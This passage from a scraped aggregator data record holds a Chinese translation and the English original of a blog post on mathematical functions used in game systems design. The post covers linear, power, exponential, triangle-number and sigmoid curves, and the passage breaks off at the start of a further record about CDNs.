\u3002\u8fd9\u662f\u7531\u5982\u4e0b\u51fd\u6570\u7ed9\u51fa\u7684\uff1a \u611f\u89c9\u4e0e\u4e0a\u9762\u7684\u8d1f\u529f\u7387\u66f2\u7ebf\u975e\u5e38\u76f8\u4f3c\uff0c\u4f46\u6709\u51e0\u4e2a\u6709\u7528\u7684\u529f\u80fd\u3002\u9996\u5148\uff0c\u5b83\u672c\u8d28\u4e0a\u662f\u6807\u51c6\u5316\u7684\uff1b \\(f(0) = 1\\)\uff0c\u5f53 \\(x\\) \u63a5\u8fd1\u65e0\u7a77\u5927\u65f6\uff0c\u5b83\u603b\u662f\u63a5\u8fd1 0\u3002\u5c31\u50cf\u201c\u5c0f\u201d\u6307\u6570\u66f2\u7ebf\u4e00\u6837\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4e00\u4e2a\u6f02\u4eae\u7684\u5706\u5f62\u5e95\u5ea7\uff0c\u5b83\u4e5f\u53ef\u4ee5\u672c\u8d28\u4e0a\u88ab\u6293\u4f4f\u3002\u4f8b\u5982\uff0c\u5982\u679c \\(f(x) = \\frac{1}{2^x}\\)\uff0c\u5219\u8f93\u51fa\u5728 \\(x\\) \u7684\u6bcf\u4e2a\u5355\u4f4d\u6b65\u957f\u5904\u51cf\u534a\u3002\u4e09\u89d2\u5f62\u6570\u975e\u5e38\u6709\u8da3\u3002\u60f3\u8c61\u4e00\u4e0b\uff0c\u60a8\u5c06\u5f39\u73e0\u6392\u5217\u6210\u7b49\u8fb9\u4e09\u89d2\u5f62\uff0c\u4e00\u8fb9\u6709 \\(n\\) \u4e2a\u5f39\u73e0\u3002\u4f60\u603b\u5171\u9700\u8981\u591a\u5c11\u9897\u5f39\u73e0\u624d\u80fd\u5b8c\u6210\u4e09\u89d2\u5f62\uff1f\n\u7b54\u6848\u603b\u662f n \u7684\u4e09\u89d2\u5f62\u6570\uff0c\\(T_n\\)\u3002\u6700\u521d\uff0c\u4e09\u89d2\u5f62\u6570\u88ab\u5b9a\u4e49\u4e3a\u6574\u6570\u5e8f\u5217\uff1a\u4e5f\u5c31\u662f\u8bf4\uff0c\\(n\\) \u7684\u4e09\u89d2\u5f62\u6570\u53ea\u662f 1 \u548c \\(n\\) \u4e4b\u95f4\u6240\u6709\u6574\u6570\u7684\u548c\u3002\u4f46\u662f\u8fd9\u4e2a\u603b\u548c\u53ef\u4ee5\u6982\u62ec\u4e3a\u4e00\u4e2a\u51fd\u6570\uff1a\u4e09\u89d2\u5f62\u51fd\u6570\u770b\u8d77\u6765\u5f88\u50cf\u5e42\u51fd\u6570\uff0c\u5c3d\u7ba1\u5b83\u662f\u4e00\u6761\u5fae\u5999\u4e0d\u540c\u7684\u66f2\u7ebf\u3002\u5b83\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u7279\u6027\uff1a\\(f(x) - f(x-1) = x\\)\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a\u6b65\u9aa4\u548c\u4e0b\u4e00\u4e2a\u6b65\u9aa4\u4e4b\u95f4\u7684\u5dee\u5f02\u4e0e\u8be5\u4e0b\u4e00\u6b65\u7684\u51fd\u6570\u503c\u76f8\u540c\u3002\u8fd9\u4f7f\u5f97\u4e09\u89d2\u5f62\u6570\u5b57\u6210\u4e3a\u9002\u7528\u4e8e\u6210\u672c\u548c\u91cc\u7a0b\u7891\u7684\u975e\u5e38\u6709\u7528\u7684\u66f2\u7ebf\uff0c\u4f8b\u5982\u5347\u7ea7\u6216\u5347\u7ea7\u5177\u6709\u8fde\u7eed\u7ea7\u522b\u7684\u4e1c\u897f\u7684\u7ecf\u9a8c\u9608\u503c\u3002\u4e09\u89d2\u5f62\u6570\u5b57\u5728 Fallen London \u4e2d\u6839\u6df1\u8482\u56fa\uff1b\u8981\u5728 FL \u4e2d\u589e\u52a0\u4e00\u4e2a\u5c5e\u6027\uff0c\u60a8\u9700\u8981\u4e0e\u4e0b\u4e00\u4e2a\u7ea7\u522b\u4e00\u6837\u591a\u7684\u201c\u66f4\u6539\u70b9\u201d\u3002\u6240\u4ee5\u4ece 4 \u7ea7\u5230 5 \u7ea7\uff0c\u4f60\u9700\u8981 5 \u4e2a\u6539\u53d8\u70b9\uff1b\u8981\u4ece 0 \u5230 5\uff0c\u60a8\u603b\u5171\u9700\u8981 \\(T_5 = 15\\) \u4e2a\u53d8\u5316\u70b9\u3002\u8fd9\u4e2a\u76f4\u89c2\u7684\u5c5e\u6027\u4e5f\u7528\u4e8e\u7b2c 3 \u7248\u9f99\u4e0e\u5730\u4e0b\u57ce\uff0c\u5176\u4e2d\u8fbe\u5230 \\(x\\) \u7ea7\u522b\u6240\u9700\u7684 XP \u4e3a \\(1000 \\times T_{x - 1}\\)\u3002\u56e0\u6b64\uff0c\u60a8\u5f53\u524d\u7ea7\u522b\u548c\u4e0b\u4e00\u4e2a\u7ea7\u522b\u4e4b\u95f4\u7684\u5dee\u5f02\u59cb\u7ec8\u662f\u60a8\u5f53\u524d\u7ea7\u522b\u7684 1000xp \u500d\u3002\u5982\u679c\u7cfb\u7edf\u5411\u73a9\u5bb6\u516c\u5f00\u6570\u5b57\uff0c\u8fd9\u6bd4\u5e42\u51fd\u6570\u66f4\u5bb9\u6613\u638c\u63e1\uff0c\u540c\u65f6\u4ecd\u7136\u5177\u6709\u8bb8\u591a\u76f8\u540c\u7684\u5c5e\u6027\u3002\n\u201csigmoid\u201d\u662f\u4efb\u4f55 S \u5f62\u66f2\u7ebf\u3002 sigmoid \u4ece\u67d0\u4e2a\u4e0b\u9650\u5f00\u59cb\uff0c\u7a33\u6b65\u4e0a\u5347\uff0c\u7136\u540e\u5728\u67d0\u4e2a\u4e0a\u9650\u5e73\u7a33\u5e73\u7a33\u3002\u6709\u8bb8\u591a\u5177\u6709\u5927\u81f4 sigmoid \u5f62\u72b6\u7684\u51fd\u6570\uff0c\u4f46\u6211\u5c06\u5728\u8fd9\u91cc\u8ba8\u8bba\u4e24\u4e2a\uff1a\u903b\u8f91\u51fd\u6570 \\(f_l\\) \u548c\u4ee3\u6570 sigmoid \\(f_s\\)\u3002\u4e0a\u56fe\uff1a\\(f_l\\)\uff0c\u7ea2\u8272\uff0c\\(f_s\\)\uff0c\u84dd\u8272\u3002\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u7cfb\u6570\u90fd\u5df2\u8c03\u6574\uff0c\u56e0\u6b64\u5b83\u4eec\u5927\u591a\u4f1a\u5bf9\u9f50\u3002\u636e\u6211\u6240\u77e5\uff0c\u8fd9\u4e2a sigmoid \u6700\u65e9\u662f\u7531 James Furness \u5728\u6e38\u620f\u8bbe\u8ba1\u7684\u4e0a\u4e0b\u6587\u4e2d\u63cf\u8ff0\u7684\u3002\u8fd9\u662f\u4e00\u6761\u5f52\u4e00\u5316\u66f2\u7ebf\uff1b\u5f53\\(x = 0\\) \u5230\\(1\\) \u65f6\\(x\\) \u8db3\u591f\u5927\u65f6\uff0c\u5b83\u7684\u8303\u56f4\u603b\u662f\u4ece\\(0\\) \u5230\\(1\\)\u3002 \\(\\sigma\\) \u548c\\(\\lambda\\) \u8fd9\u4e24\u4e2a\u7cfb\u6570\u5206\u522b\u51b3\u5b9a\u4e86\\(x\\) \u5728\u66f2\u7ebf\u8fbe\u5230\u5176\u4e0b\u9650\u4e4b\u524d\u5fc5\u987b\u6709\u591a\u5927\uff0c\u4ee5\u53ca\u66f2\u7ebf\u4e0a\u5347\u5230\u8be5\u70b9\u7684\u9661\u5ced\u7a0b\u5ea6\u3002\u8fd9\u6761\u66f2\u7ebf\u6709\u5f88\u591a\u4f18\u70b9\uff0c\u5305\u62ec\u5b83\u672c\u8d28\u4e0a\u662f\u6807\u51c6\u5316\u7684\u3002\u5b83\u4e5f\u6709\u4e00\u4e2a\u6709\u7528\u7684\u4e0d\u5bf9\u79f0\u6027\uff0c\u56e0\u4e3a\u5b83\u5f00\u59cb\u5feb\u901f\u6500\u5347\uff0c\u4f46\u76f8\u5bf9\u8f83\u6162\u3002\u8fd9\u91cc\u6709\u5f88\u591a\u7cfb\u6570\uff0c\u4f46\u903b\u8f91\u51fd\u6570\u7684\u597d\u5904\u662f\u5b83\u4eec\u90fd\u6709\u975e\u5e38\u660e\u786e\u7684\u6548\u679c\u3002\n\\(L\\) \u662f\u4e0a\u9650\uff0c\u51fd\u6570\u6536\u655b\u5230 \\(x\\) \u7684\u9ad8\u503c\u7684\u6570\u5b57\u3002 \\(k\\) \u662f\u4e00\u4e2a\u7cfb\u6570\uff0c\u51b3\u5b9a\u66f2\u7ebf\u4e0a\u5347\u7684\u9661\u5ced\u7a0b\u5ea6\uff1b\u60a8\u53ef\u4ee5\u5c06\u5176\u8bbe\u4e3a\u8d1f\u6570\u4ee5\u53cd\u8f6c\u51fd\u6570\u7684\u659c\u7387\u5e76\u83b7\u5f97\u903b\u8f91\u8870\u51cf\u66f2\u7ebf\u3002 \\(e\\) \u662f\u6b27\u62c9\u6570\uff0c\u5f53\u7136\uff0c\u4f46\u5c31\u6211\u4eec\u7684\u76ee\u7684\u800c\u8a00\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u4efb\u610f\u7684\u5e95\u6570\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u5927\u4e8e \\(1\\) \u7684\u6570\u5b57\uff0c\u4f46\u8c03\u6574\u6b64\u503c\u4e0e\u8c03\u6574 \\(k\\) \u5b8c\u5168\u7b49\u6548\u3002 \\(x_0\\) \u662f\u4e00\u4e2a\u7b80\u5355\u7684\u52a0\u6027\u7cfb\u6570\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\u5411\u5de6\u6216\u5411\u53f3\u79fb\u52a8\u66f2\u7ebf\u3002\u66f2\u7ebf\u7684\u62d0\u70b9\u4f4d\u4e8e \\(x_0\\) \u8bbe\u7f6e\u7684\u4f4d\u7f6e\u2014\u2014\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u5347\u7684\u4e2d\u70b9\u6b63\u597d\u5728\u90a3\u4e2a\u70b9\u3002\u9664\u4e86\u8ba1\u7b97\u7684\u96be\u6613\u7a0b\u5ea6\u4e0d\u540c\u4e4b\u5916\uff0c\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u4eec\u7684\u504f\u659c\u3002\u4ee3\u6570 sigmoid \u63d0\u524d\u504f\u659c\uff0c\u524d\u7f6e \\(x\\) \u7684\u5f71\u54cd\uff1b\u903b\u8f91\u51fd\u6570\u662f\u5b8c\u5168\u5bf9\u79f0\u7684\u3002\u4e0a\u56fe\uff1a\u4e24\u4e2a sigmoid \u51fd\u6570\u7684\u5bfc\u6570\u56fe\u3002\u5b83\u4eec\u90fd\u662f\u949f\u5f62\u66f2\u7ebf\uff0c\u4f46\u4ee3\u6570 sigmoid \u7684\u201c\u51f8\u70b9\u201d\u660e\u663e\u504f\u5411\u5de6\u4fa7\u3002\u9996\u5148\uff0c\u5b83\u4eec\u662f\u5f52\u4e00\u5316\u51fd\u6570\uff1b\u4ed6\u4eec\u5c06\u63a5\u53d7\u4e00\u4e2a\u65e0\u754c\u8f93\u5165\u5e76\u5410\u51fa\u4e00\u4e2a\u6709\u754c\u8f93\u51fa\u3002\u5f53\u7136\uff0c\u6839\u636e\u60a8\u671f\u671b\u7684\u8f93\u5165\u503c\u7684\u7c7b\u578b\uff0c\u8be5\u8f93\u51fa\u53ef\u80fd\u4e0d\u5305\u542b\u6709\u5173\u539f\u59cb\u8f93\u5165\u7684\u5927\u91cf\u4fe1\u606f\u3002\n\u7531\u4e8e\u5176\u6709\u754c\u8f93\u51fa\uff0csigmoid \u975e\u5e38\u9002\u5408\u5bf9\u67d0\u4e8b\u7269\u7684\u589e\u957f\u5b9e\u65bd\u4e0a\u9650\u548c\u9650\u5236\uff0c\u6216\u8005\u5728\u4e24\u4e2a\u503c\u4e4b\u95f4\u8fdb\u884c\u5e73\u6ed1\u3002\u4f24\u5bb3\u8870\u51cf\uff1a\u5728 0.5 \u548c 1 \u4e4b\u95f4\u5b9a\u4e49\u903b\u8f91\u66f2\u7ebf\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u6839\u636e\u4e0e\u76ee\u6807\u7684\u8ddd\u79bb\u4e58\u4ee5\u6b66\u5668\u9020\u6210\u7684\u4f24\u5bb3\u3002\u903b\u8f91\u51fd\u6570\u5728\u8fd9\u91cc\u5f88\u6709\u7528\uff0c\u56e0\u4e3a\u901a\u8fc7\u8c03\u6574 \\(k\\) \u548c \\(x_0\\)\uff0c\u4e0d\u540c\u7684\u6b66\u5668\u53ef\u4ee5\u5177\u6709\u4e0d\u540c\u7684\u5c04\u7a0b\u548c\u6216\u591a\u6216\u5c11\u7684\u5c16\u9510\u8870\u51cf\u66f2\u7ebf\u3002\u901f\u5ea6\u5956\u52b1\uff1a\u5728\u5177\u6709\u8bc4\u5206\u548c\u6392\u884c\u699c\u7684\u6e38\u620f\u4e2d\uff0c\u903b\u8f91\u66f2\u7ebf\u53ef\u7528\u4e8e\u6839\u636e\u5173\u5361\u7684\u6807\u51c6\u65f6\u95f4\u6765\u8861\u91cf\u901f\u5ea6\u5956\u52b1\u3002\u5feb\u901f\u5b8c\u6210\u5173\u5361\u7684\u73a9\u5bb6\u5c06\u83b7\u5f97\u6700\u5927\u7684\u5956\u52b1\uff1b\u975e\u5e38\u7f13\u6162\u5730\u5b8c\u6210\u5173\u5361\u7684\u73a9\u5bb6\u5c06\u4e00\u65e0\u6240\u83b7\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\\(x\\) \u662f\u5b8c\u6210\u65f6\u95f4\uff0c\\(k\\) \u662f\u8d1f\u6570\uff0c\u53cd\u8f6c\u66f2\u7ebf\u7684\u659c\u7387\u3002 NPC \u503e\u5411\uff1a\u60a8\u7684\u6e38\u620f\u662f\u4e00\u79cd\u793e\u4ea4\u6a21\u62df\uff0c\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u662f\u5c06 NPC \u503e\u5411\u4fee\u9970\u7b26\u5806\u53e0\u5728\u4e00\u8d77\uff0c\u4f8b\u5982\u5341\u5b57\u519b\u4e4b\u738b 3\u3002\u4f7f\u7528 sigmoid \u53ef\u7528\u4e8e\u5c06\u65e0\u754c\u6570\u5b57\u89c4\u8303\u5316\u4e3a\u6709\u754c\u503c\uff0c\u4f8b\u5982\u4f5c\u4e3a\u8f93\u5165\u9762\u90e8\u52a8\u753b\u7cfb\u7edf\u3002\u518d\u4e00\u6b21\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u7269\u5bd3\u8a00\uff1b\u6709\u9650\u7684\u6709\u8da3\u6807\u672c\u9009\u62e9\u3002\u6709\u6bd4\u8fd9\u91cc\u66f4\u591a\u7684\u7528\u4f8b\u548c\u793a\u4f8b\uff0c\u4f46\u6211\u5e0c\u671b\u8fd9\u4e9b\u53ef\u4ee5\u4f5c\u4e3a\u4eba\u4eec\u6709\u7528\u7684\u8d77\u70b9\u3002\u5982\u679c\u60a8\u6709\u95ee\u9898\u3001\u60f3\u6307\u51fa\u9519\u8bef\u6216\u5bf9\u6211\u672a\u5305\u62ec\u7684\u5185\u5bb9\u63d0\u51fa\u5efa\u8bae\uff0c\u90a3\u4e48\u63d0\u95ee\u7684\u6700\u4f73\u5730\u70b9\u662f\u901a\u8fc7 tumblr\u3002\u6211\u4e0d\u662f\u7b2c\u4e00\u4e2a\u5c06\u8fd9\u4e9b\u60f3\u6cd5\u5e94\u7528\u5230\u6e38\u620f\u8bbe\u8ba1\u4e2d\u7684\u4eba\uff0c\u5176\u4e2d\u5f88\u591a\u60f3\u6cd5\u81f3\u5c11\u5728\u884c\u4e1a\u7684\u67d0\u4e9b\u5b50\u96c6\u4e2d\u662f\u5e7f\u4e3a\u4eba\u77e5\u7684\u3002\u6211\u5728\u8fd9\u91cc\u7684\u5927\u90e8\u5206\u60f3\u6cd5\uff08\u4ee5\u53ca\u8bb0\u5f55\u5b83\u7684\u613f\u671b\uff09\u6765\u81ea\u4e0e\u540c\u4e8b\u7684\u5bf9\u8bdd\uff0c\u5c24\u5176\u662f Emily Short\uff0c\u5979\u6700\u521d\u5411\u6211\u6307\u51fa\u4e86\u903b\u8f91\u66f2\u7ebf\u3002", "note_en": "Whether your game surfaces its numbers to the player or not, odds are it has underlying systems that rely on them, and you use functions to determine how those numbers affect each other. In other words, a mathematical function is usually at the core of the answer to a bunch of frequent game design questions.\n How does the player character\u2019s speed change when the sprint button is held?\n And so on. Sometimes those questions are about the explicit math undergirding game rules; sometimes they\u2019re more about analysis and intent, about the spreadsheet you\u2019re building to later turn into a loot or progression table that the game will express in some other way.\n This isn\u2019t meant as a comprehensive primer on those functions let alone some sort of taxonomy. It\u2019s more a collection of interesting specimens, alongside histories, use cases, and observations on their behavior.\n     Let\u2019s first establish a baseline by talking about the simplest function, \\(f(x) = bx + a\\). This is useful to point out the basics of parametrization \u2013 by adjusting \\(b\\), we can change the function\u2019s slope to make it steeper or shallower; by adjusting \\(a\\) we can shift the output up or down by some amount.\n The main reason to use a linear curve is simplicity and clarity. Players can grasp a linear system pretty intuitively, and those functions will hold to several properties that players will expect. For example, if you double \\(x\\), then \\(f(x)\\) will also double. If you increase \\(x\\) by some value \\(y\\), then \\(f(x)\\) will increase by the same amount no matter what \\(x\\) was. This kind of clarity can be invaluable to players who are trying to optimize something.\n This simplicity, of course, precludes more complex behaviors. In a lot of game systems, players won\u2019t be cognizant of the underlying numbers and will be learning how the system works by \u201cfeel\u201d \u2013 in which case, using an easily graspable linear function might not even be any more clear to the player at all. And of course sometimes we  don\u2019t want game systems to be immediately clear.\n   There are several \u201cfamilies\u201d of power functions but at first we should talk about \\(f(x) = x^b\\), where \\(b\\) is some small counting number greater than 1, like 2, 3, or 4.\n Power functions \u201cfeel\u201d very different in the range \\(0 \\leq x \\leq 1 \\) than they do when \\(x \\gt 1\\). Inside the unit square, they \u201cbulge\u201d down and away from the linear function, meeting at the 0 and 1 points. Outside that square, \\(f_{\\mathrm{linear}}(x) \\lt f_{\\mathrm{quadratic}}(x)\\), and the slope increases to infinity.\n  If you expect a normalized input where \\(0 \\leq x \\leq 1\\), power functions are often used to add \u201cjuice\u201d to animations or character movement, as easing functions, and so on.\n The \u201couter\u201d range where \\(x \\gt 1\\) is more interesting in designing systems. Power functions give you accelerating growth, which feels powerful for players and, indeed, is inherently dangerous.\n Say the player character\u2019s damage and enemy hit points both scale exponentially with their level; say \\(f_\\mathrm{damage}(x_\\mathrm{level}) = x_\\mathrm{level}^2\\). In practice, the game stays at the same balance if the player is of the same level as the enemies, but the numbers grow explosively. As we know, player happy when number big; this is the kind of thing that works well for games with visible damage numbers.\n However, as the player gains levels, each subsequent level is a little less significant. You can understand why by looking at a graph of \\(\\frac{f(x)}{f(x) + 1}\\):\n  A level 1 player fighting a level 2 enemy might as well be doing 25% damage, whereas the difference between level 10 and level 11 is nowhere near as dramatic. This isn\u2019t nearly as noticeable if x is always a bigger integer, of course, but it\u2019s still there.\n  Everything is relative, so the \u201cfeel\u201d of a growth curve will depend on what it\u2019s being compared against. To illustrate this with power curves, consider an RPG where:\n As the player increases in level and enters higher-level content, quest rewards (in money) scale quadratically;\n  Consumables quickly become unlimited, at least as far as money is concerned. After a few levels you can buy as many potions as you need.\n  Equipment becomes cheaper relative to quest rewards, though higher-level equipment is still meaningfully more expensive than low-level equipment. If overleveled equipment is available to buy, it becomes more and more affordable.\n  If you lose a party member, the level of effort to pay for their resurrection is always about the same.\n These kinds of relationships, of course, emerge from using any function against any other function. It\u2019s very useful to look at the ratios between different functions at different stages of the game, and using those relationships is very important in achieving whatever player experience goals you have.\n  Reconsidering \\(f(x) = x^s\\), we obviously can look at exponents other than 2, 3, and 4. It\u2019s very common to use a value of \\(s\\) that\u2019s a fractional number to fine-tune the curve and make it exactly as dramatic as intended.\n But there are two other useful cases. The first is when \\(s\\) is some fractional number between 0 and 1. These are  diminishing returns functions, where the rate of change decreases as \\(x\\) increases, but \\(f(x)\\) keeps increasing forever.\n  This kind of function has many, many applications. First of all, it front-loads the effect of \\(x\\); you get the most benefit from having a little of it, instead of stacking a lot of it. A good use for this might be something like damage reduction. Say you can equip a certain amount \\(x\\) of cold-resistant items, and all together they negate \\(10x^{0.5}\\) cold damage. Your first cold-resistant item negates 10 damage. But to double that protection and negate 20 damage, you have to  quadruple the number of cold-resistant items you have equipped. Putting on another warm pair of mittens, thermal vest, or ushanka will always increase the amount of damage reduction the player gets, but having  some is vastly more important and noticeable than having  a lot.\n Finally, we come to negative powers. If you don\u2019t remember how negative powers work: raising something to a negative power is the same thing as taking the inverse of a positive power; that is:\n  The latter might be easier to reason about, and is probably computationally faster, if that matters for your application.\n  Note that for a function like \\(f(x) = x^{-s}\\), the value for \\(x = 0\\) is undefined, and it approaches infinity. This tends to not be useful, so you will usually see this in the form \\(f(x) = (x + 1)^{-s}\\), which normalizes it so that \\(f(0) = 1\\).\n You can think of this as an easing-out function; it slows down as \\(x\\) increases, though it never quite plateaus. Effects are very front-loaded; in the graph above, the first point of \\(x\\) will  halve \\(y\\), but subsequent points are nowhere near as efficient. But the time we\u2019re at 4, effects are pretty marginal.\n The clearest use case for this is as a multiplier for something else which reduces it \u2013 giving the player a discount based on their Barter skill, reducing incoming damage based on their armor, and so on. Because of its slowing-down nature, it\u2019s useful for negative effects that can be stacked \u2013 for example, reducing the player\u2019s speed as they accumulate stacks of a debuff. Subsequent stacks will always have an effect, but the majority of the impact comes from the first one.\n    The exponential function, \\(f(x) = b^x\\), in which \\(b \\gt 1\\). Shown above, specifically, is \\(e^x - 1\\).\n Like the power functions, the exponential function grows to infinity.  Unlike with the power function, the rate of growth keeps accelerating in pace with the growth of the value itself, so the relative multiplicative value of each increase stays the same.\n  Exponential growth blows up even more than quadratic or cubic growth; if those functions created big, player-pleasing numbers, exponential functions are liable to create even bigger ones. It may make sense to use an exponential function when:\n You want the numbers to truly explode. Maybe you\u2019re exposing them to the player and your game is  about seeing that giant pile of zeroes. Maybe your game deals with a huge range of scales. Maybe the input has a small range but you want that small range to translate into  dramatic changes in output.  Example: A comical physics-driven golf game where the joke is that the 9-iron shoots the ball \\(2^9\\) times further than the 0-iron.\n  You want multiplicative consistency; that is, the absolute increase when you increase the input will grow, but the ratio between level 10 and level 11 is the same as the ratio between level 1 and level 2.\n  You\u2019re not worried about game balance, either because the input of the function is strictly bounded, or because you just don\u2019t care.  Example: Player hit point growth is exponential, but the base is small and the game has a level cap, so we know what the min and max values are.\n  Example: Again, an idle game where the joke  is that the numbers explode and are unbounded, until the game itself breaks.\n Keep in mind that while exponential curves usually look like very sharp \u201chockey stick\u201d curves, you can have a shallow exponential curve! Just use a base that\u2019s barely above 1. Say you use exponential scaling for the player\u2019s hit points, based on their level, and your game is capped at 20 levels. You can define a function like \\(f(x) = 8 \\times 1.25^x\\). This leads to numbers that feel relatively sane \u2013 the player starts with 10 hit points at level 1 and will have nearly 700 at level 20 \u2013 but still increase rapidly in absolute terms, while keeping the relative increase.\n Exponential functions can also be surprisingly intuitive. The \\(8 \\times 1.25^x\\) example above is essentially \u201c8 hit points at level 0, and a 25% increase each level.\u201d This can be actively easier for players to understand, in some contexts, than a quadratic function.\n An useful perceptual trick when you are exposing numbers to the player \u2013 directly or indirectly through something like a bar that grows in length \u2013 is to make each  absolute increase bigger than the last one, giving the player a sensation of rising power, while maintaining their  relative marginal value. The exponential function does that.\n A close relative to the exponential growth curve is the exponential decay curve. This is given by a function like:\n  It feels very similar to the negative power curve above, but has a couple of useful features. First, it\u2019s inherently normalized; \\(f(0) = 1\\), and it always approaches 0 as \\(x\\) approaches infinity. Like with the \u201csmall\u201d exponential curve, it can also be inherently graspable if you use a nice round base.\n For example, if \\(f(x) = \\frac{1}{2^x}\\), the output halves at each unit step of \\(x\\).\n  Triangle numbers are very interesting. Imagine you\u2019re arranging marbles into an equilateral triangle, with \\(n\\) marbles to a side. How many marbles do you need in total to complete the triangle?\n The answer is always the triangle number for n, \\(T_n\\). Originally, triangle numbers are defined as an integer sequence:\n  That is, the triangle number for \\(n\\) is just the sum of all integers between 1 and \\(n\\). But this sum generalizes into a function:\n    The triangle function looks a lot like a power function, though it\u2019s a subtly distinct curve. It has a nice feature: \\(f(x) - f(x-1) = x\\). That is, the difference between one step and the next is the same as the value of the function at that next step.\n This makes triangle numbers a very useful curve to apply to costs and milestones, like experience thresholds to level up or upgrading something with successive levels.\n The triangle numbers are ingrained in  Fallen London; to increase an attribute in FL, you need as many \u201cchange points\u201d as the next level. So to go from, say, level 4 to 5, you need 5 change points; to get from 0 to 5, you will need \\(T_5 = 15\\) change points in total.\n This intuitive property was also used in 3rd Edition  Dungeons &amp; Dragons, where the XP needed to get to a level \\(x\\) is \\(1000 \\times T_{x - 1}\\). Therefore, the difference between your current level and the next is always 1000xp times your current level.\n If a system exposes the numbers to players, this can be more graspable than a power function while still having many of the same properties.\n  A \u201csigmoid\u201d is any s-shaped curve. A sigmoid starts at some lower bound, rises steadily, and then smoothly plateaus at some upper bound.\n There are many functions with a roughly sigmoid shape, but I\u2019ll talk here about two: The logistic function, \\(f_l\\), and the algebraic sigmoid \\(f_s\\).\n  Above: \\(f_l\\), in red, and \\(f_s\\), in blue. Both functions have had their coefficients adjusted so they would mostly line up.\n   As far as I know, this sigmoid was first described in the context of game design by  James Furness. It\u2019s a normalized curve; it always ranges from \\(0\\) when \\(x = 0\\) on to \\(1\\) at some point when \\(x\\) is large enough.\n The two coefficients, \\(\\sigma\\) and \\(\\lambda\\), respectively determine how big \\(x\\) has to be before the curve reaches its lower bound, and how steeply the curve rises to that point.\n There are a lot of nice things about this curve, including that it\u2019s inherently normalized. It also has a useful asymmetry, in that the it starts climbing quickly but plateaus relatively slowly.\n   There are a lot of coefficients here, but the nice thing about the logistic function is that all of them have very well-defined effects.\n \\(L\\) is the upper bound, the number the function converges to for high values of \\(x\\).\n  \\(k\\) is a coefficient that determines how steeply the curve rises; you can make this a negative number to invert the slope of the function and get a logistic decay curve.\n  \\(e\\) is Euler\u2019s number, of course, but for our purposes it\u2019s just an arbitrary base. You could use any number greater than \\(1\\), though adjusting this value is completely equivalent to adjusting \\(k\\).\n  \\(x_0\\) is a simple additive coefficient that shifts the curve left or right as desired. The inflection point of the curve is wherever \\(x_0\\) is set \u2013 that is, the midpoint in the rise is exactly at that point.\n Besides the difference in how easy they are to compute, the main difference is in their skew. The algebraic sigmoid skews early, front-loading the effect of \\(x\\); the logistic function is perfectly symmetrical.\n  Above: A graph of the derivatives of the two sigmoid functions. They are both bell curves, but the algebraic sigmoid\u2019s \u201cbump\u201d is noticeably skewed to the left.\n  First, they are normalization functions; they will take an unbounded input and spit out a bounded output. Depending on the kinds of values you expect for the input, that output might not contain a lot of information about the original input, of course.\n  Because of their bounded output, sigmoids are great for implementing caps and limits on the growth of something, or for smoothing between two values.\n  Damage faloff: It\u2019s very simple to define a logistic curve between, say, 0.5 and 1, which multiplies the damage done by a weapon based on the distance to the target. The logistic function is useful here because different weapons could have different ranges and more or less sharp faloff curves by adjusting \\(k\\) and \\(x_0\\).\n  Speed bonus: On a game with scoring and leaderboards, a logistic curve could be used to scale a speed bonus based on a par time for the level. Players who complete the level very fast would get the maximum bonus; players who complete the level very slowly would get nothing. In this case, \\(x\\) is the completion time, and \\(k\\) is negative, inverting the curve\u2019s slope.\n  NPC disposition: Your game is a social simulation and it works by stacking NPC disposition modifiers on top of each other, like  Crusader Kings 3. Using a sigmoid can be useful for normalizing an unbounded number into a bounded value, for example as an input to a facial animation system.\n  Again, this is a  bestiary; a limited selection of interesting specimens. There are more use cases and examples than the ones here, but I hope those work as a useful starting point for folks.\n If you have a question, want to point out an error, or have a suggestion of something I didn\u2019t include, the best place to ask questions is through  tumblr.\n I\u2019m not the first to apply any of those ideas to game design, and a lot of this is widely known at least in some subset of the industry. Much of my thinking here (and desire to document it) has emerged from conversations with colleagues, in particular Emily Short, who originally pointed out the logistic curve to me.", "posttime": "2021-08-05 20:57:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8bbe\u8ba1,\u8bbe\u8ba1\u5e08,functions,\u73a9\u5bb6", "title": "\u7cfb\u7edf\u8bbe\u8ba1\u5e08\u7684\u529f\u80fd\u5927\u5168", "title_en": "A Bestiary of Functions for Systems Designers", "transed": 1, "url": "https://brunodias.dev/2021/03/19/functions-for-system-designers.html", "via": "", "real_tags": ["\u8bbe\u8ba1", "\u8bbe\u8ba1\u5e08", "functions", "\u73a9\u5bb6"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071344, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u672f\u8bed\u201cCDN\u201d\uff08\u201c\u5185\u5bb9\u4ea4\u4ed8\u7f51\u7edc\u201d\uff09\u8ba9\u4eba\u8054\u60f3\u5230\u7ba1\u7406\u5927\u91cf\u786c\u4ef6\u7684\u8c37\u6b4c\u89c4\u6a21\u7684\u516c\u53f8\uff0c\u6bcf\u79d2\u5904\u7406\u6570\u767e\u5343\u5146\u6bd4\u7279\u3002\u4f46\u662f CDN \u53ea\u662f Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4e0d\u662f\u6211\u4eec\u503e\u5411\u4e8e\u8ba4\u4e3a\u5b83\u4eec\u7684\u65b9\u5f0f\uff0c\u4f46\u8fd9\u5c31\u662f\u5b83\u4eec\u7684\u5168\u90e8\u3002\u5f53\u60a8\u5750\u5728\u5496\u5561\u5e97\u65f6\uff0c\u60a8\u53ef\u4ee5\u5728\u4e00\u53f0\u4f7f\u7528\u4e86 8 